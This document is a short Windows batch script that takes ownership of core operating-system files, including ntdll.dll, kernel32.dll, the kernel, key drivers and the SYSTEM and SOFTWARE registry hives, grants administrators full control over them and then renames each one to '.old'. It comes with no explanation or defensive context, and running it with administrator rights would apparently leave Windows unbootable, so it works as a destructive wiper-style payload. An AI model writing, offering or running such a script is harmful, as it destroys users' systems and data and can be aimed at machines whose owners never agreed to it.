@echo off
:: Files to modify
set files="C:\Windows\System32\ntdll.dll C:\Windows\System32\kernel32.dll C:\Windows\System32\hal.dll C:\Windows\System32\ntoskrnl.exe C:\Windows\System32\win32k.sys C:\Windows\System32\config\system C:\Windows\System32\config\software C:\Windows\System32\drivers\ntfs.sys C:\Windows\System32\drivers\tcpip.sys C:\Windows\System32\drivers\ndis.sys"

:: Take ownership and modify permissions
for %%f in (%files%) do (
    takeown /f %%f
    icacls %%f /grant administrators:F
)

:: Rename files
for %%f in (%files%) do (
    ren %%f %%~nf.old
)
